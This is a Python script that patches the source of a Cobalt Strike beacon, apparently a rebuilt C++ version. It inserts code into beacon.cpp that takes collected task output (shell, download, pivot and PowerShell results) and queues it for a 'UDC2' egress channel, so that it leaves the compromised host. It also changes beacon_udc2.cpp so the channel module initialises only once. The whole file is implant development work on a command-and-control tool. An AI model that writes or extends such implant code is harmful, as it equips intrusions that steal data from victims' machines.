#!/usr/bin/env python3
"""Patch beacon.cpp: externs + engage-block output drain; udc2_init booted."""
import io

p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon.cpp"
s = io.open(p, encoding="utf-8").read()

old = "extern int http_post_len;"
assert s.count(old) == 1, s.count(old)
new = old + """

/* tier-2 item6: drain aggregated callback output into the UDC2 egress */
extern int client_take_pending(char * out, int max);
extern void udc2_queue(char * data, int length);"""
s = s.replace(old, new)

old2 = """		if (beacon_cycles >= 1 && udc2_init()) {
			post_type = POST_UDC2;
			pivot_poll(command_shell_callback);
			download_poll(command_shell_callback, MAX_PACKET);
			link_poll(command_shell_callback);
			psh_poll(command_shell_callback, MAX_PACKET);
			if (check_kill_date())
				command_die(command_shell_callback);
			length = udc2_cycle(buffer, MAX_GET);"""
assert s.count(old2) == 1, "engage block not found: %d" % s.count(old2)
new2 = """		if (beacon_cycles >= 1 && udc2_init()) {
			static char udc2_out[256 * 1024];
			int take;
			post_type = POST_UDC2;
			pivot_poll(command_shell_callback);
			download_poll(command_shell_callback, MAX_PACKET);
			link_poll(command_shell_callback);
			psh_poll(command_shell_callback, MAX_PACKET);
			if (check_kill_date())
				command_die(command_shell_callback);
			/* flush queued callback output into the UDC2 egress queue -
			 * in engage mode no HTTP submit ever drains it, so without
			 * this task output never leaves the process */
			take = client_take_pending(udc2_out, (int)sizeof(udc2_out));
			if (take > 0)
				udc2_queue(udc2_out, take);
			length = udc2_cycle(buffer, MAX_GET);"""
s = s.replace(old2, new2)
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("beacon.cpp patched")

p2 = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon_udc2.cpp"
s2 = io.open(p2, encoding="utf-8").read()
old3 = """	bof_set_pin(FALSE);

	return udc2.info.proxy != NULL;"""
assert s2.count(old3) == 1, "init tail not found"
new3 = """	bof_set_pin(FALSE);

	/* loaded once per beacon lifetime: the pin claim frees the previous
	 * block on a retry, so a second load would dangle the callbacks that
	 * are already installed and running */
	udc2.booted = TRUE;
	return udc2_enabled();"""
s2 = s2.replace(old3, new3)
io.open(p2, "w", encoding="utf-8", newline="").write(s2)
print("beacon_udc2.cpp patched")
